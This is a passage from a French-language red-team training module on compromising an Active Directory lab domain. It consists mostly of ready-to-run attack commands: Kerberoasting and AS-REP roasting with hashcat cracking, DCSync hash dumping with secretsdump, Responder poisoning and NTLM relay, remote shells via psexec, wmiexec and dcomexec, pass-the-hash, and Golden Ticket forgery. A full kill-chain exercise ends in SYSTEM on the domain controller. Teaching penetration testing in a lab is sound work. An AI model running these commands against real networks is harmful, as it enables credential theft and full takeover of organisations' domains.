# $krb5tgs$23$*svc_sql$SDV-M2.LAB$sdv-m2.lab/svc_sql*$...
# $krb5tgs$23$*svc_http$SDV-M2.LAB$sdv-m2.lab/svc_http*$...

# ─── Export des hashs vers un fichier ─────────────────────────────────────────
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request \
  -outputfile exports/hashes/kerberoast-hashes.txt

# ─── Demande de TGS pour un utilisateur spécifique ────────────────────────────
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request \
  -request-user svc_sql

# ─── Avec hash NTLM (sans mot de passe) ───────────────────────────────────────
GetUserSPNs.py sdv-m2.lab/jdoe@192.168.1.10 -hashes ':NTHASH' -request
```

**Craquage des hashs Kerberos :**

```bash
# ─── Mode hashcat pour Kerberos TGS = 13100 ──────────────────────────────────
hashcat -m 13100 exports/hashes/kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt

# ─── Mode hashcat avec règles ─────────────────────────────────────────────────
hashcat -m 13100 exports/hashes/kerberoast-hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule --force

# ─── Mode John pour Kerberos ─────────────────────────────────────────────────
john exports/hashes/kerberoast-hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 6.6 AS-REP Roasting (GetNPUsers.py)

L'AS-REP Roasting cible les utilisateurs pour lesquels la pré-authentification Kerberos est désactivée (UAC flag `DONT_REQUIRE_PREAUTH`). On peut demander un AS-REP sans connaître le mot de passe.

```bash
# ─── Demande de TGT pour les utilisateurs sans pré-authentification ───────────
GetNPUsers.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10

# Sortie type (si un compte est vulnérable) :
# $krb5asrep$23$jsmith@SDV-M2.LAB:... (hash à craquer)

# ─── Avec utilisation d'un fichier d'utilisateurs (sans auth) ─────────────────
GetNPUsers.py sdv-m2.lab/ -usersfile exports/users.txt -dc-ip 192.168.1.10

# ─── Export vers fichier ──────────────────────────────────────────────────────
GetNPUsers.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 \
  -outputfile exports/hashes/asrep-hashes.txt

# ─── Mode hashcat pour AS-REP = 18200 ─────────────────────────────────────────
hashcat -m 18200 exports/hashes/asrep-hashes.txt /usr/share/wordlists/rockyou.txt
```

### 6.7 Autres outils impacket utiles

#### GetADUsers.py

```bash
# ─── Énumération des utilisateurs AD (tous les attributs) ─────────────────────
GetADUsers.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -all

# ─── Avec filtre sur un utilisateur spécifique ────────────────────────────────
GetADUsers.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -user jdoe
```

#### lookupsid.py

```bash
# ─── Bruteforce SID via RPC (sans authentification possible) ─────────────────
lookupsid.py anonymous@192.168.1.10

# ─── Avec authentification ────────────────────────────────────────────────────
lookupsid.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10
```

#### rpcdump.py

```bash
# ─── Énumération des endpoints RPC ────────────────────────────────────────────
rpcdump.py 192.168.1.10

# Cherche les interfaces RPC vulnérables :
# - 12345678-1234-ABCD-EF00-0123456789AB (lsarpc)
# - 12345778-1234-ABCD-EF00-0123456789AC (samr)
```

#### ticketer.py

```bash
# ─── Forge d'un Golden Ticket ─────────────────────────────────────────────────
impacket-ticketer -nthash 'KRBTGT_NTHASH' \
  -domain-sid 'S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX' \
  -domain sdv-m2.lab \
  -user-id 500 \
  Administrator

# ─── Forge d'un Silver Ticket (pour un service) ───────────────────────────────
impacket-ticketer -nthash 'SERVICE_NTHASH' \
  -domain-sid 'S-1-5-21-...' \
  -domain sdv-m2.lab \
  -spn 'CIFS/dc01.sdv-m2.lab' \
  Administrator
```

#### goldenPac.py

```bash
# ─── Golden Ticket + PSExec en une commande ──────────────────────────────────
goldenPac.py sdv-m2.lab/Administrator@dc01.sdv-m2.lab \
  -dc-ip 192.168.1.10 -target-ip 192.168.1.10
```

### 6.8 TP Guidé — Extraction de hashs via Impacket

#### Contexte

Vous avez les droits administrateur sur le DC du domaine `sdv-m2.lab` avec les identifiants `jdoe:P@ssw0rd`.

#### Étape 1 : DCSync — Extraction de tous les hashs du domaine

```bash
# ─── Extraction des hashs du domaine (méthode DRSUAPI) ────────────────────────
secretsdump.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -just-dc \
  -outputfile exports/dcsync-full

# ─── Vérification des résultats ───────────────────────────────────────────────
cat exports/dcsync-full.ntds
# Format : username:RID:LM_HASH:NT_HASH:::

# ─── Extraire uniquement les hashs NT ─────────────────────────────────────────
grep -v '^\$' exports/dcsync-full.ntds | cut -d: -f1,4 > exports/hashes/nt-hashes-only.txt

# ─── Identifier le hash KRBTGT (critique pour Golden Ticket) ──────────────────
grep 'krbtgt' exports/dcsync-full.ntds
```

#### Étape 2 : Kerberoasting

```bash
# ─── Identification des comptes SPN ──────────────────────────────────────────
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10

# ─── Demande des TGS ─────────────────────────────────────────────────────────
GetUserSPNs.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request \
  -outputfile exports/hashes/kerb-hashes.txt

# ─── Craquage ─────────────────────────────────────────────────────────────────
hashcat -m 13100 exports/hashes/kerb-hashes.txt /usr/share/wordlists/rockyou.txt --force
```

#### Étape 3 : AS-REP Roasting

```bash
# ─── Identification des comptes sans pré-authentification ────────────────────
GetNPUsers.py sdv-m2.lab/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 \
  -outputfile exports/hashes/asrep-hashes.txt

# ─── Craquage ─────────────────────────────────────────────────────────────────
hashcat -m 18200 exports/hashes/asrep-hashes.txt /usr/share/wordlists/rockyou.txt --force
```

#### Étape 4 : Exécution de commandes distantes

```bash
# ─── Shell via wmiexec (discret) ──────────────────────────────────────────────
wmiexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10

# ─── Shell via psexec (moins discret) ─────────────────────────────────────────
psexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10

# ─── Shell via dcomexec (très discret) ────────────────────────────────────────
dcomexec.py sdv-m2.lab/jdoe:'P@ssw0rd'@192.168.1.10 -object MMC20
```

#### Étape 5 : Pass-the-Hash avec les hashs obtenus

```bash
# ─── Utilisation du hash Administrateur pour un accès complet ─────────────────
psexec.py sdv-m2.lab/Administrator@192.168.1.10 -hashes ':ADMIN_NTHASH'

# ─── Vérifier que vous êtes SYSTEM ───────────────────────────────────────────
# C:\Windows\system32> whoami
# nt authority\system
```

---

## 7. Énumération sans authentification

### 7.1 Introduction

Même sans disposer d'identifiants valides, il est possible d'obtenir des informations sur un environnement Active Directory via des protocoles legacy ou mal configurés.

**Technique MITRE ATT&CK : T1087 — Account Discovery / T1078 — Valid Accounts (Guest)**

Ces techniques sont particulièrement utiles en phase de reconnaissance initiale, avant d'avoir compromis un compte.

### 7.2 NULL Session

Les **NULL sessions** sont une vulnérabilité historique de Windows (pré-Windows 2000) qui permet de se connecter à un partage IPC$ sans authentification. Bien que Microsoft ait restreint ce comportement dans les versions récentes, des configurations legacy peuvent encore l'autoriser.

```bash
# ─── Test de NULL session avec net use (Windows) ──────────────────────────────
net use \\192.168.1.10\IPC$ "" /u:""
# Si la connexion réussit, les partages sont accessibles sans auth

# ─── Test de NULL session avec smbclient ──────────────────────────────────────
smbclient -L //192.168.1.10 -N
# -N : no password (NULL session)
```

#### enum4linux

`enum4linux` est un outil Perl qui automatise l'énumération via NULL sessions et RPC.

```bash
# ─── Installation ─────────────────────────────────────────────────────────────
sudo apt update && sudo apt install -y enum4linux

# ─── Énumération complète via NULL session ────────────────────────────────────
enum4linux -a 192.168.1.10

# Sortie type (extrait) :
# ============================
#    Target Information
# ============================
# Target ........... 192.168.1.10
# RID Cycling ...... ENABLED
#
# ============================================
#    Users on 192.168.1.10
# ============================================
# Index: 0x1 RID: 0x1f4  acb: 0x00000210 Account: Administrator
# Index: 0x2 RID: 0x1f5  acb: 0x00000215 Account: Guest
# Index: 0x3 RID: 0x1f7  acb: 0x00000211 Account: DefaultAccount
# Index: 0x4 RID: 0x1f8  acb: 0x00000211 Account: krbtgt
# Index: 0x5 RID: 0x3e8  acb: 0x00000210 Account: jdoe
# Index: 0x6 RID: 0x3e9  acb: 0x00000210 Account: asmith
# ...

# Options enum4linux :
#   -a         : tout énumérer (équivaut à -U -S -G -P -r -o -L -i)
#   -U         : lister les utilisateurs
#   -S         : lister les partages
#   -G         : lister les groupes
#   -P         : lister les politiques de mot de passe
#   -r         : RID cycling (bruteforce des RID)
#   -o         : informations sur le OS
#   -L         : LSA policy
#   -i         : paramètres de la NP (named pipe)
```

```bash
# ─── Énumération utilisateurs uniquement ──────────────────────────────────────
enum4linux -U 192.168.1.10

# ─── Énumération des partages uniquement ──────────────────────────────────────
enum4linux -S 192.168.1.10

# ─── RID Cycling (bruteforce des identifiants RID) ────────────────────────────
enum4linux -r 192.168.1.10

# ─── Politique de mot de passe ────────────────────────────────────────────────
enum4linux -P 192.168.1.10

# Sortie :
# ============================================
#    Password Policy on 192.168.1.10
# ============================================
# Password Info for Domain: SDV-M2
#     Password History Length: 24
#     Maximum Password Age: 42 jours
#     Minimum Password Age: 1 jour
#     Minimum Password Length: 8
#     Password Properties: DOMAIN_PASSWORD_COMPLEX
#     Account Lockout Threshold: 5 tentatives
#     Lockout Duration: 30 minutes
```

#### rpcclient

`rpcclient` est un outil plus fin qui permet d'interagir directement avec les services RPC.

```bash
# ─── Connexion avec NULL session ──────────────────────────────────────────────
rpcclient -U "" -N 192.168.1.10

# Une fois connecté (invite rpcclient $>) :

# ─── Lister les utilisateurs ─────────────────────────────────────────────────
rpcclient $> enumdomusers
# Sortie :
# user:[Administrator] rid:[0x1f4]
# user:[Guest] rid:[0x1f5]
# user:[krbtgt] rid:[0x1f6]
# user:[jdoe] rid:[0x3e8]
# user:[asmith] rid:[0x3e9]

# ─── Informations sur un utilisateur spécifique ──────────────────────────────
rpcclient $> queryuser 0x3e8
# Sortie :
#       User Name   : jdoe
#       Full Name   : John Doe
#       Home Drive  :
#       Dir Drive   :
#       Profile Path:
#       Logon Script:
#       Description :
#       Workstations:
#       Comment     :
#       Remote Dial :
#       Logon Time               : Thu, 01 Jan 2025 00:00:00 UTC
#       Logoff Time              : Thu, 01 Jan 1970 00:00:00 UTC
#       Kickoff Time             : Thu, 01 Jan 1970 00:00:00 UTC
#       Password last set Time   : Mon, 01 Jan 2025 08:30:00 UTC
#       Password can change Time : Mon, 01 Jan 2025 08:30:00 UTC
#       Password must change Time: Thu, 01 Jan 1970 00:00:00 UTC

# ─── Lister les groupes ──────────────────────────────────────────────────────
rpcclient $> enumdomgroups

# ─── Membres d'un groupe ─────────────────────────────────────────────────────
rpcclient $> querygroupmem 0x200  # Domain Admins

# ─── Informations sur un groupe ──────────────────────────────────────────────
rpcclient $> querygroup 0x200

# ─── Énumération des SID ─────────────────────────────────────────────────────
rpcclient $> lookupsids S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500
# Résout un SID en nom d'utilisateur

# ─── Politique de mot de passe ────────────────────────────────────────────────
rpcclient $> getdompwinfo

# ─── Quitter ─────────────────────────────────────────────────────────────────
rpcclient $> exit
```

**Commandes rpcclient utiles :**

| Commande | Description |
|----------|-------------|
| `enumdomusers` | Lister tous les utilisateurs |
| `enumdomgroups` | Lister tous les groupes |
| `queryuser <rid>` | Détails d'un utilisateur |
| `querygroup <rid>` | Détails d'un groupe |
| `querygroupmem <rid>` | Membres d'un groupe |
| `enumalsgroups <builtin|domain>` | Groupes locaux |
| `getdompwinfo` | Politique de mot de passe |
| `lookupnames <name>` | Résoudre un nom en SID |
| `lookupsids <sid>` | Résoudre un SID en nom |
| `enumpriv <user>` | Privilèges d'un utilisateur |
| `srvinfo` | Informations sur le serveur |
| `netshareenum` | Lister les partages |
| `netsharegetinfo <share>` | Infos sur un partage |

### 7.3 Guest Account

Le compte **Guest** est un compte local présent sur toutes les installations Windows. Bien que désactivé par défaut dans les versions récentes, il arrive qu'il soit activé dans certaines configurations.

```bash
# ─── Vérifier si le compte Guest est actif ────────────────────────────────────
# Via enum4linux :
enum4linux -a 192.168.1.10 | grep -i guest

# Via rpcclient :
rpcclient -U "" -N 192.168.1.10
rpcclient $> queryuser 0x1f5
# Voir le champ "acb_flags" : 0x0215 = compte activé, 0x0211 = désactivé

# ─── Tester un accès avec le compte Guest ─────────────────────────────────────
# Mot de passe souvent vide
crackmapexec smb 192.168.1.10 -u Guest -p ''
crackmapexec smb 192.168.1.10 -u Guest -p 'Guest'

# ─── Avec smbclient ───────────────────────────────────────────────────────────
smbclient -L //192.168.1.10 -U Guest
# Mot de passe : (laisser vide)
```

### 7.4 SMB Null Session sur anciennes versions

Sur les systèmes anciens (Windows 2000, XP, Server 2003) ou mal configurés, la NULL session est encore possible :

```bash
# ─── Test avec net view (ancienne commande Windows) ───────────────────────────
net view \\192.168.1.10

# ─── Utilisation de nmap scripts pour l'énumération ───────────────────────────
nmap --script smb-enum-shares -p 445 192.168.1.10
nmap --script smb-enum-users -p 445 192.168.1.10
nmap --script smb-enum-groups -p 445 192.168.1.10
nmap --script smb-os-discovery -p 445 192.168.1.10
nmap --script smb-protocols -p 445 192.168.1.10
nmap --script smb-security-mode -p 445 192.168.1.10
nmap --script smb-server-stats -p 445 192.168.1.10
nmap --script smb-system-info -p 445 192.168.1.10

# ─── Smbclient avec NULL session pour lister les partages ─────────────────────
smbclient -L //192.168.1.10 -N
```

### 7.5 Autres techniques d'énumération sans auth

#### DNS Enumeration

```bash
# ─── Interrogation DNS des enregistrements AD ─────────────────────────────────
# Les enregistrements SRV d'AD sont publics si le DNS est accessible

# Résolution des DCs via SRV :
nslookup -type=srv _ldap._tcp.sdv-m2.lab
nslookup -type=srv _kerberos._tcp.sdv-m2.lab
nslookup -type=srv _gc._tcp.sdv-m2.lab

# Avec dig :
dig _ldap._tcp.sdv-m2.lab SRV
dig _kerberos._tcp.sdv-m2.lab SRV

# ─── Zone transfer (si mal configuré) ─────────────────────────────────────────
dig axfr @192.168.1.10 sdv-m2.lab
```

#### SMB OS Fingerprinting (sans auth)

```bash
# ─── Avec nmap ────────────────────────────────────────────────────────────────
nmap -p 445 --script smb-os-discovery 192.168.1.10

# Avec smbclient :
smbclient -L //192.168.1.10 -N

# Avec CME (sans authentification) :
crackmapexec smb 192.168.1.10
```

### 7.6 TP Guidé — Énumération sans authentification

#### Contexte

Vous êtes en phase de reconnaissance initiale. Vous n'avez pas encore d'identifiants valides. Le domaine cible est `sdv-m2.lab`.

#### Étape 1 : Découverte des services

```bash
# ─── Scan initial du DC ───────────────────────────────────────────────────────
nmap -p 135,139,445,389,636,88,464,3268,3269 192.168.1.10

# Ports à rechercher :
# 135 → RPC (WMI)
# 139 → NetBIOS
# 445 → SMB
# 389 → LDAP
# 636 → LDAPS
# 88  → Kerberos
# 464 → Kerberos kpasswd
# 3268 → Global Catalog
```

#### Étape 2 : Test de NULL session

```bash
# ─── Test avec rpcclient ──────────────────────────────────────────────────────
rpcclient -U "" -N 192.168.1.10
# Si connexion réussie :
enumdomusers
enumdomgroups
getdompwinfo
exit
```

#### Étape 3 : Énumération via enum4linux

```bash
# ─── Énumération complète ─────────────────────────────────────────────────────
enum4linux -a 192.168.1.10 2>&1 | tee exports/enum4linux-output.txt

# Analyse des résultats :
grep -E "User:|Group:|Password Info|Share" exports/enum4linux-output.txt
```

#### Étape 4 : DNS Enumeration

```bash
# ─── Découverte des DCs ───────────────────────────────────────────────────────
dig _ldap._tcp.sdv-m2.lab SRV +short
dig _kerberos._tcp.sdv-m2.lab SRV +short
dig _gc._tcp.sdv-m2.lab SRV +short

# ─── Tentative de zone transfer ───────────────────────────────────────────────
dig axfr @192.168.1.10 sdv-m2.lab
```

#### Étape 5 : Test Guest Account

```bash
# ─── Tester le compte Guest ──────────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u Guest -p ''
crackmapexec smb 192.168.1.10 -u Guest -p 'Guest'

# ─── Si Guest est actif, énumérer les partages ────────────────────────────────
crackmapexec smb 192.168.1.10 -u Guest -p '' --shares
```

#### Étape 6 : Synthèse

```bash
# ─── Compilation des informations obtenues sans auth ──────────────────────────
cat > exports/recon-no-auth.md << 'EOF'
# Reconnaissance sans authentification — sdv-m2.lab

## DC identifié
- IP : 192.168.1.10
- Hostname : dc01.sdv-m2.lab
- OS : Windows Server 2022

## NULL Session
- [OUI/NON] : Connexion possible via rpcclient

## Guest Account
- [OUI/NON] : Compte Guest actif/partages accessibles

## DNS
- DC : dc01.sdv-m2.lab
- Kerberos : dc01.sdv-m2.lab:88
- LDAP : dc01.sdv-m2.lab:389
- Global Catalog : dc01.sdv-m2.lab:3268

## Utilisateurs découverts
- Administrator (RID 500)
- Guest (RID 501)
- krbtgt (RID 502)
- jdoe (RID 1000)
- asmith (RID 1001)

## Recommandations
- Activer SMB Signing
- Désactiver les NULL sessions
- Désactiver le compte Guest
- Restreindre les transferts de zone DNS
EOF
```

---

## 8. TP Synthèse

### 8.1 Scénario global

Ce TP de synthèse met en œuvre **l'ensemble du kill chain** vu dans ce module, depuis la capture initiale de hash jusqu'à la compromission totale du domaine.

**Réseau cible :**

```
┌─────────────────────────────────────────────────────────────────┐
│                         sdv-m2.lab                              │
│                                                                 │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │
│  │   DC01       │    │   WS01      │    │   SQL01     │         │
│  │ 192.168.1.10│    │ 192.168.1.20│    │ 192.168.1.30│         │
│  │ Server 2022 │    │ Windows 10  │    │ Server 2019 │         │
│  └─────────────┘    └─────────────┘    └─────────────┘         │
│        │                  │                  │                  │
│        └──────────────────┴──────────────────┘                  │
│                         Réseau 192.168.1.0/24                   │
│                                                                 │
│  ┌─────────────┐                                                │
│  │   Kali      │ ← Vous êtes ici                                │
│  │ 192.168.1.99│                                                │
│  └─────────────┘                                                │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2 Workflow complet

```
Phase 1 : Reconnaissance passive
    ↓
Phase 2 : Capture de hash (Responder)
    ↓
Phase 3 : Craquage du hash / SMB Relay
    ↓
Phase 4 : Énumération AD (CME, BloodHound, LDAP)
    ↓
Phase 5 : Extraction de hashs (secretsdump.py)
    ↓
Phase 6 : Exécution de commandes (wmiexec/psexec)
    ↓
Phase 7 : Persistance (Golden Ticket)
```

### 8.3 Phase 1 — Reconnaissance

```bash
# ─── Étape 1 : Scan réseau initial ────────────────────────────────────────────
# Identifier les hôtes actifs
nmap -sn 192.168.1.0/24 -oN exports/recon/hosts.txt

# ─── Étape 2 : Scan de services ───────────────────────────────────────────────
nmap -p 135,139,445,389,636,88,464,3268,3269,3389,5985,5986 \
  192.168.1.0/24 -oN exports/recon/services.txt

# ─── Étape 3 : DNS Enumeration ────────────────────────────────────────────────
dig _ldap._tcp.sdv-m2.lab SRV +short
dig _kerberos._tcp.sdv-m2.lab SRV +short

# ─── Étape 4 : Test NULL session ──────────────────────────────────────────────
rpcclient -U "" -N 192.168.1.10 -c "enumdomusers;enumdomgroups;getdompwinfo" \
  2>&1 | tee exports/recon/null-session.txt

# ─── Étape 5 : Scan SMB avec CME ──────────────────────────────────────────────
crackmapexec smb 192.168.1.0/24 -oJ exports/recon/cme-scan.json
```

### 8.4 Phase 2 — Capture de hash (Responder)

```bash
# ─── Étape 1 : Lancement de Responder ─────────────────────────────────────────
sudo python3 /opt/Responder/Responder.py -I eth0 -w -v \
  -o exports/responder/

# ─── Étape 2 : Simuler une attente / provocation ─────────────────────────────
# Depuis un poste Windows, l'utilisateur tape \\FILESERVER dans l'explorateur
# Responder capture le hash NTLMv2

# ─── Étape 3 : Récupération du hash ───────────────────────────────────────────
mkdir -p exports/hashes
cp /opt/Responder/logs/SMB-NTLMv2-*.txt exports/hashes/responder-hash.txt 2>/dev/null
cat exports/hashes/responder-hash.txt
```

### 8.5 Phase 3 — Craquage du hash (Hashcat)

```bash
# ─── Option A : Craquage offline ──────────────────────────────────────────────
hashcat -m 5600 exports/hashes/responder-hash.txt \
  /usr/share/wordlists/rockyou.txt --force -O

hashcat -m 5600 --show exports/hashes/responder-hash.txt
# Si craqué → mot de passe en clair

# ─── Option B : SMB Relay (si SMB signing désactivé) ──────────────────────────
# Détection des cibles :
crackmapexec smb 192.168.1.0/24 --gen-relay-list exports/smb-relay-targets.txt

# Lancement du relay (dans un terminal) :
impacket-ntlmrelayx -tf exports/smb-relay-targets.txt -smb2support -i -socks

# Lancement de Responder sans SMB (autre terminal) :
sed -i 's/SMB = On/SMB = Off/' /opt/Responder/Responder.conf
sudo python3 /opt/Responder/Responder.py -I eth0 -v
```

### 8.6 Phase 4 — Énumération AD

```bash
# ─── Avec CrackMapExec ────────────────────────────────────────────────────────
# Authentification avec les identifiants obtenus
MOTDEPASSE='P@ssw0rd'  # ← Remplacer par le mot de passe craqué
UTILISATEUR='jdoe'      # ← Remplacer par l'utilisateur compromis

# Test d'authentification :
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE

# Énumération utilisateurs :
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE --users
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE --groups
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE --shares
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE --sessions

# Kerberoasting via CME :
crackmapexec ldap 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE \
  --kerberoast exports/hashes/kerb-hashes.txt

# AS-REP Roasting via CME :
crackmapexec ldap 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE \
  --asreproast exports/hashes/asrep-hashes.txt

# ─── Avec BloodHound ─────────────────────────────────────────────────────────
# Collecte :
bloodhound-python -d sdv-m2.lab \
  -u $UTILISATEUR -p $MOTDEPASSE \
  -dc dc01.sdv-m2.lab -gc dc01.sdv-m2.lab \
  -c ALL --zip -ns 192.168.1.10 \
  -o exports/bloodhound/

# Analyse :
# 1. Lancer Neo4j : sudo neo4j start
# 2. Lancer BloodHound GUI : /opt/BloodHound/BloodHound &
# 3. Uploader le ZIP
# 4. Exécuter les requêtes Analysis

# ─── Avec ldapdomaindump ──────────────────────────────────────────────────────
ldapdomaindump ldap://192.168.1.10 \
  -u "SDV-M2\\$UTILISATEUR" -p $MOTDEPASSE \
  -o exports/ldapdump/
```

### 8.7 Phase 5 — Extraction de hashs (secretsdump.py)

```bash
# ─── DCSync - Extraction NTDS.dit ─────────────────────────────────────────────
secretsdump.py "sdv-m2.lab/$UTILISATEUR:$MOTDEPASSE"@192.168.1.10 \
  -just-dc -outputfile exports/dcsync

# ─── Analyse des hashs extraits ───────────────────────────────────────────────
cat exports/dcsync.ntds

# Extraire le hash KRBTGT (pour Golden Ticket) :
KRBTGT_HASH=$(grep 'krbtgt' exports/dcsync.ntds | cut -d: -f4)
echo "KRBTGT NTHASH: $KRBTGT_HASH"

# Extraire le hash Administrateur :
ADMIN_HASH=$(grep '^Administrator:' exports/dcsync.ntds | cut -d: -f4)
echo "Admin NTHASH: $ADMIN_HASH"

# ─── Vérification des hashs extraits ──────────────────────────────────────────
# Compter le nombre de comptes extraits :
wc -l exports/dcsync.ntds
```

### 8.8 Phase 6 — Exécution de commandes

```bash
# ─── Avec wmiexec.py (discret) ────────────────────────────────────────────────
wmiexec.py "sdv-m2.lab/$UTILISATEUR:$MOTDEPASSE"@192.168.1.10

# ─── Avec psexec.py (moins discret) ───────────────────────────────────────────
psexec.py "sdv-m2.lab/$UTILISATEUR:$MOTDEPASSE"@192.168.1.10

# ─── Avec CME (exécution rapide) ──────────────────────────────────────────────
crackmapexec smb 192.168.1.10 -u $UTILISATEUR -p $MOTDEPASSE -x whoami

# ─── Pass-the-Hash (avec Administrateur) ──────────────────────────────────────
psexec.py sdv-m2.lab/Administrator@192.168.1.10 -hashes ":$ADMIN_HASH"
```

### 8.9 Phase 7 — Golden Ticket (Persistance)

```bash
# ─── Étapes pour forger un Golden Ticket ──────────────────────────────────────
# 1. Récupérer le SID du domaine
DOMAIN_SID=$(impacket-lookupsid "sdv-m2.lab/$UTILISATEUR:$MOTDEPASSE"@192.168.1.10 \
  | grep "Domain Sid" | cut -d: -f2 | tr -d ' ')
echo "Domain SID: $DOMAIN_SID"

# 2. Forger le Golden Ticket
impacket-ticketer -nthash $KRBTGT_HASH \
  -domain-sid $DOMAIN_SID \
  -domain sdv-m2.lab \
  -user-id 500 \
  -groups 512,520,518,519 \
  Administrator

# 3. Exporter le ticket dans une variable d'environnement
export KRB5CCNAME=$(pwd)/Administrator.ccache

# 4. Tester le ticket
impacket-psexec -k -no-pass sdv-m2.lab/Administrator@dc01.sdv-m2.lab

# 5. Vérifier que nous sommes SYSTEM :
# C:\Windows\system32> whoami
# nt authority\system
# C:\Windows\system32> hostname
# DC01
```

### 8.10 Tableau MITRE ATT&CK

| Technique | ID MITRE | Outil utilisé | Description |
|-----------|----------|---------------|-------------|
| Account Discovery | T1087 | ldapsearch, windapsearch, CME | Énumération des comptes AD |
| Permission Groups Discovery | T1069 | BloodHound, enum4linux | Découverte des groupes |
| System Network Connections Disc. | T1049 | CrackMapExec | Cartographie du réseau |
| OS Credential Dumping | T1003.003 | secretsdump.py (SAM) | Extraction SAM |
| OS Credential Dumping | T1003.006 | secretsdump.py (DCSync) | Extraction NTDS.dit |
| Steal or Forge Kerberos Tickets | T1558.001 | ticketer.py (Golden) | Forge de Golden Ticket |
| Steal or Forge Kerberos Tickets | T1558.003 | GetUserSPNs.py | Kerberoasting |
| Steal or Forge Kerberos Tickets | T1558.004 | GetNPUsers.py | AS-REP Roasting |
| Man-in-the-Middle | T1557 | Responder | Empoisonnement LLMNR |
| LLMNR/NBT-NS Poisoning | T1557.001 | Responder | Capture de hash NTLMv2 |
| Remote Services | T1021.002 | psexec.py, wmiexec.py | Exécution à distance SMB/WMI |
| Remote Services | T1021.003 | dcomexec.py | Exécution via DCOM |
| Remote Services | T1021.006 | wmiexec.py | Exécution via WinRM |
| Use Alternate Authentication Material | T1550.002 | Pass-the-Hash | Utilisation hash NTLM |
| Use Alternate Authentication Material | T1550.003 | Pass-the-Ticket | Utilisation ticket Kerberos |
| Remote System Discovery | T1018 | nmap, dig, CME | Découverte des hôtes |
| Domain Trust Discovery | T1482 | ldapsearch, BloodHound | Énumération des trusts |
| Valid Accounts | T1078 | Guest, NULL session | Utilisation comptes par défaut |
| Brute Force | T1110.003 | Password Spraying | Test de mots de passe |

### 8.11 Heat Map d'attaque AD

La heat map ci-dessous représente les différents chemins d'attaque possibles dans un environnement AD typique, du niveau de privilège le plus bas (utilisateur domaine) au plus haut (contrôleur de domaine) :

```
                              ┌───────────────────┐
                              │  Contrôleur de     │
                              │  Domaine (DC)      │
                              │  ✦ CIBLE FINALE ✦ │
                              └────────┬──────────┘
                                       │
                        ┌──────────────┼──────────────┐
                        │              │              │
               ┌────────┴───┐  ┌───────┴──────┐  ┌───┴────────┐
               │ DCSync     │  │ Golden Ticket │  │ Admin      │
               │ (DRSUAPI)  │  │ (KRBTGT)     │  │ local DC   │
               └────────────┘  └──────────────┘  └────────────┘
                        ▲              ▲              ▲
                        │              │              │
               ┌────────┴──────────────┴──────────────┴────────┐
               │           Domain Admins / Enterprise Admins    │
               │               ✦ HIGH VALUE TARGETS ✦          │
               └────────┬──────────────┬──────────────┬────────┘
                        │              │              │
              ┌─────────┴───┐  ┌───────┴──────┐  ┌───┴──────────┐
              │ Kerberoast  │  │ ACL Abuse    │  │ Delegation   │
              │ (SPN)       │  │ (WriteDacl)  │  │ (Constrained)│
              └─────────────┘  └──────────────┘  └──────────────┘
                        ▲              ▲              ▲
                        │              │              │
              ┌─────────┴──────────────┴──────────────┴──────────┐
              │          Utilisateurs privilégiés                 │
              │          (AdminCount=1, HA/service accounts)      │
              └────────┬──────────────┬──────────────┬───────────┘
                       │              │              │
             ┌─────────┴───┐  ┌───────┴──────┐  ┌───┴───────────┐
             │ AS-REP Roast│  │ Session Hijack│  │ SMB Relay     │
             │ (No PreAuth)│  │ (HasSession)  │  │ (NTLM Relay)  │
             └─────────────┘  └──────────────┘  └───────────────┘
                       ▲              ▲              ▲
                       │              │              │
             ┌─────────┴──────────────┴──────────────┴───────────┐
             │              Utilisateurs standard                 │
             │              (jdoe, asmith, etc.)                  │
             └────────┬──────────────┬──────────────┬────────────┘
                      │              │              │
            ┌─────────┴───┐  ┌───────┴──────┐  ┌───┴────────────┐
            │ Responder   │  │ Password      │  │ NULL Session   │
            │ (LLMNR/NBT) │  │ Spraying      │  │ (enum4linux)   │
            └─────────────┘  └──────────────┘  └────────────────┘
                      ▲              ▲              ▲
                      │              │              │
            ┌─────────┴──────────────┴──────────────┴────────────────┐
            │              Aucun accès (Anonyme / Guest)              │
            │              ✦ POINT DE DÉPART ✦                       │
            └────────────────────────────────────────────────────────┘
```

**Légende de la heat map :**
- 🔴 **Rouge** : Accès direct au DC / Domain Admin
- 🟠 **Orange** : Escalade de privilèges possible
- 🟡 **Jaune** : Mouvement latéral / collecte d'infos
- 🟢 **Vert** : Accès initial / Reconnaissance

### 8.12 Checklist de l'engagement

```markdown
# Checklist Engagement AD — Red Team

## Phase 1 : Reconnaissance
- [ ] Scan réseau (nmap, masscan)
- [ ] DNS enumeration (SRV records, zone transfer)
- [ ] NULL session test (enum4linux, rpcclient)
